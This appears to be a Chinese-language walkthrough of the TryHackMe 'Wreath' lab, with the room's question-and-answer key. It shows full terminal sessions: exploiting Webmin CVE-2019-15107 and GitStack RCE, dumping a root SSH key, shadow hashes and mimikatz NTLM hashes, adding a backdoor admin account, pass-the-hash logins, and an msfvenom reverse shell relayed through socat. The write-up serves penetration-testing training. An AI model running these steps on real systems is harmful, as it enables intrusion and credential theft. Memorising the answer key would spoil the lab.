# Task 5  Webserver Enumeration

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -p-15000 -vv 10.200.101.200 -oG initial-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:17 EDT
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2022-08-22 03:17:30 EDT for 261s
Not shown: 14773 filtered tcp ports (no-response), 220 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack ttl 63
80/tcp    open   http             syn-ack ttl 63
443/tcp   open   https            syn-ack ttl 63
6666/tcp  closed irc              reset ttl 63
9090/tcp  closed zeus-admin       reset ttl 63
9999/tcp  open   abyss            syn-ack ttl 63
10000/tcp open   snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 274.30 seconds
           Raw packets sent: 44868 (1.974MB) | Rcvd: 265 (17.652KB)

```


详细
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -sV -Pn -A -O 10.200.101.200 -p 22,80,443,9999,10000     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:29 EDT
Nmap scan report for thomaswreath.thm (10.200.101.200)
Host is up (0.24s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2022-08-22T02:10:16
|_Not valid after:  2023-08-22T02:10:16
9999/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.890 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   235.66 ms 10.50.102.1
2   235.80 ms thomaswreath.thm (10.200.101.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.34 seconds

```

> How many of the first 15000 ports are open on the target?

> 4

(明明扫出来是5个，不知道答案为什么是4个)

> What OS does Nmap think is running?

> centos

> Open the IP in your browser -- what site does the server try to redirect you to?

> https://thomaswreath.thm/

> Read through the text on the page. What is Thomas' mobile phone number?

> 447821548812 

> Look back at your service scan results: what server version does Nmap detect as running here?

> MiniServ 1.890 (Webmin httpd)

> What is the CVE number for this exploit?

> CVE-2019-15107

# Task 6  Webserver Exploitation

拿到初始shell

```
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# chmod +x ./CVE-2019-15107.py
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# ./CVE-2019-15107.py 10.200.101.200

        __        __   _               _         ____   ____ _____                                                                                                                                                                          
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                                                                                         
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                                                                                           
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                                                                                          
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                @MuirlandOracle                                                                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.101.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                                                                                                                                                          
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

哈希
```
# cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:9
```

ssh 秘钥
```
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
#
```

登录
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# chmod 600 id_rsa                                                                                          255 ⨯
                                                                                                                    
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# ssh -i id_rsa root@10.200.101.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# whoami
root
```

> Which user was the server running as?

> root

> What is the root user's password hash?

> $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

> What is the full path to this file?

> /root/.ssh/id_rsa

# Task 8  Pivoting High-level Overview

> Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

> Tunnelling

> Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?

> portfwd 

# Task 9  Pivoting Enumeration

> What is the absolute path to the file containing DNS entries on Linux?

> /etc/resolv.conf

> What is the absolute path to the hosts file on Windows?

> C:\Windows\System32\drivers\etc\hosts

> How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

> for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

# Task 10  Pivoting Proxychains & Foxyproxy

> What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

> socks4 127.0.0.1 4242

> What command would you use to telnet through a proxy to 172.16.0.100:23?

> proxychains telnet 172.16.0.100 23

> You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

> fp

# Task 11  Pivoting SSH Tunnelling / Port Forwarding

> If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

> l

> Which switch combination can be used to background an SSH port forward or tunnel?

> -fN

> It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

> nay

> What command would you use to create a pair of throwaway SSH keys for a reverse connection?

> ssh-keygen

> If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

> ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

> What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

> ssh -D 8000  user@target.thm -fN

> If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

> ssh -r 8000:127.0.0.1:80 user@172.16.0.50 -fN

# Task 12  Pivoting plink.exe

> What tool can be used to convert OpenSSH keys into PuTTY style keys?

> puttygen

# Task 13  Pivoting Socat

> Which socat option allows you to reuse the same listening port for more than one connection?

> reuseaddr 

> If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

> ./socat tcp-l:8000 tcp:172.16.0.200:443

> What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

> ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

# Task 14  Pivoting Chisel

> What command would you use to start a chisel server for a reverse connection on your attacking machine?

> ./chisel server -p 4242 --reverse

> What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

> ./chisel client 172.16.0.200:4242 R:socks &

> How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

> ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

> If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

> ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80s

# Task 15  Pivoting sshuttle

> How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

> sshuttle -r pwned@172.16.20.7 172.16.0.0/16

> What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

> --ssh-cmd "ssh -i priv_key"

> You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

> -x  172.16.0.100

# Task 17  Git Server Enumeration

nmap扫描内网存活主机。-sn表示只扫描主机，不扫描端口
```
[root@prod-serv ~]# ./nmap -sn 10.200.101.1-255 -oN scan-max

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:41 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-1.eu-west-1.compute.internal (10.200.101.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00045s latency).
MAC Address: 02:23:3F:A3:95:4B (Unknown)
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Host is up (0.00019s latency).
MAC Address: 02:50:72:C7:62:41 (Unknown)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Host is up (-0.10s latency).
MAC Address: 02:2B:51:EC:71:61 (Unknown)
Nmap scan report for ip-10-200-101-250.eu-west-1.compute.internal (10.200.101.250)
Host is up (0.00047s latency).
MAC Address: 02:CC:C0:0D:98:63 (Unknown)
Nmap scan report for ip-10-200-101-200.eu-west-1.compute.internal (10.200.101.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds

```

10.200.101.1是网关
10.200.101.250是ovpn服务器
10.200.101.200是linux靶机自己

因此，我们的目标是
```
10.200.101.100
10.200.101.150
```

扫描100，全端口都被过滤
```
[root@prod-serv ~]# ./nmap 10.200.101.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:45 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00014s latency).
All 6150 scanned ports on ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100) are filtered
MAC Address: 02:50:72:C7:62:41 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.52 seconds
```

150有返回
```
[root@prod-serv ~]# ./nmap 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:48 BST
Scanned at 2022-08-22 13:48:13 BST for 207s
Not shown: 6143 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8888/tcp open  ddi-tcp-1

```


扫描前15000个端口
```
[root@prod-serv ~]# ./nmap -p-15000 -vv 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:53 BST
Discovered open port 5985/tcp on 10.200.101.150
Completed SYN Stealth Scan at 13:58, 309.14s elapsed (15000 total ports)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up, received arp-response (0.0082s latency).
Scanned at 2022-08-22 13:53:08 BST for 309s
Not shown: 14993 filtered ports
Reason: 14993 no-responses
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
135/tcp  open  epmap         syn-ack ttl 128
139/tcp  open  netbios-ssn   syn-ack ttl 128
445/tcp  open  microsoft-ds  syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
8888/tcp open  ddi-tcp-1     syn-ack ttl 128

```

> Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?

> 2

> In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)

> 100,150

> Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?

> 150

> Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

> 80,3389,5985

> Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

> http

# Task 18  Git Server Pivoting

用sshuttle做一个流量隧道直接访问内网

```
sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.200.101.200
```


浏览器访问


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661223640246.jpg)

搜索web app漏洞
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# searchsploit Gitstack                                                                                      255 ⨯
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                   | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                 | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                            | php/webapps/43777.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

有一个远程执行漏洞

> What is the name of the program running the service?

> Gitstack

> Do these default credentials work (Aye/Nay)?

> nay

> There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?

> 43777

# Task 19  Git Server Code Review

> Look at the information at the top of the script. On what date was this exploit written?

> 18.01.2018

> Bearing this in mind, is the script written in Python2 or Python3?

> python2

> Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?

> csrftoken

# Task 20  Git Server Exploitation

exploit-db的脚本我这边会报错，使用github上[这个脚本](https://github.com/TBernard97/Gitstack-2.3.10-Exploit-Refactor/blob/master/exploit_refactored.py)

拿到shell

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# python3 exploit_refactored.py 10.200.101.150
[+] Connected to http://10.200.101.150:80/ successfully.
[*] Creating users on http://10.200.101.150:80/.
[*] Found user twreath
[*] Web repository already created
[*] Getting repository list
[*] Found repo: Website
[*] Adding user twreath to repository
[*] Disabling everyone user access to repository
b'Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. '

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.

> whoami
"nt authority\system
" 

> hostname
"git-serv

```

> What is the hostname for this target?

> git-serv

> What operating system is this target?

> Windows

> What user is the server running as?

> NT AUTHORITY\SYSTEM

> How many make it to the waiting listener?

> 0



由于我们现在是system账号，并且靶机开启了3389和5985端口，可以通过添加一个添加一个用户到rdp组合administrators组，从而远程登录


```

> net user max max123456 /add
"The command completed successfully.

" 

> net localgroup Administrators max /add
"The command completed successfully.

" 

> net localgroup "Remote Management Users" max /add
"The command completed successfully.


```


rdp登录
```
xfreerdp /u:max /p:'max123456' /v:10.200.101.150 +clipboard 
```

win登录
```
evil-winrm -u max -p max123456 -i 10.200.101.150
```

# Task 21  Git Server Stabilisation & Post Exploitation

rdp进去导出哈希

```
C:\Users\max\Documents>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 20153          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00501fb8} 3 F 6391130     GIT-SERV\max    S-1-5-21-3335744492-1614955177-2693036043-1003  (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6436616     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : crimsonsolid
  Hash NTLM: 3e678b266d1d449e531e92bec33b6d27

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1ea046bff032220775c4baa7316df55e

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVcrimsonsolid
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f372574e920c61b28546de59f13a198e861f2147f68bb91a0d2e235f4cf8b3f
      aes128_hmac       (4096) : f9889efb598feaa32b62b253745d17a8
      des_cbc_md5       (4096) : a21f9702bc54080e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVcrimsonsolid
    Credentials
      des_cbc_md5       : a21f9702bc54080e


RID  : 000003eb (1003)
User : max
  Hash NTLM: cf4836436d2bebf810c5167ac154bdcb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 959f2ea9834aca1bbd4ff41a5e2f0901

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVmax
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f1be2fd9f46ad817398db9919a859283d93d9080abff427929f98d25432e03b6
      aes128_hmac       (4096) : 863d45f005ac9781f52e94a5f2b2f503
      des_cbc_md5       (4096) : dcd5b0542abc4525

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVmax
    Credentials
      des_cbc_md5       : dcd5b0542abc4525

```

> What is the Administrator password hash?

> 37db630168e5f82aafa8461e05c6bbd1

> What is the NTLM password hash for the user "Thomas"?

> 02d90eda8f6b6b06c32d5f207831101f

> What is Thomas' password?

> i<3ruby


管理员哈希登录：

```
evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.101.150
```


# Task 24  Command and Control Empire: Overview

> Can we get an agent back from the git server directly (Aye/Nay)?

> nay

# Task 27  Command and Control Empire: Agents

> Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?

> shell whoami




## 转发rev shell流量到msf

编译一个exe,ip和端口写linux转发机器的
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.200.101.200 LPORT=15123 -f exe >exp.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

```


在linux机器用socat做一个rev shell转发
```
[root@prod-serv tmp]# ./socat-max TCP4-LISTEN:15123,FORK  TCP4:10.50.102.104:443
```


kali设置监听
```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.102.104    yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


```


触发
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload exp.exe
Info: Uploading exp.exe to C:\Users\Administrator\Documents\exp.exe

                                                             
Data: 98400 bytes of 98400 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> .\exp.exe

```


收到rev shell
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.102.104:443 
[*] Sending stage (175174 bytes) to 10.200.101.200
[*] Meterpreter session 2 opened (10.50.102.104:443 -> 10.200.101.200:60588) at 2022-08-24 05:08:24 -0400

meterpreter > getuid
Server username: GIT-SERV\Administrator

```



## 转发rev shell流量到Cobalt Strike


创建一个linux IP端口的监听http-n

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333191618.jpg)

创建一个CS本地IP端口的监听http


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333299286.jpg)

使用http-n监听生成一个exe文件

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333364837.jpg)
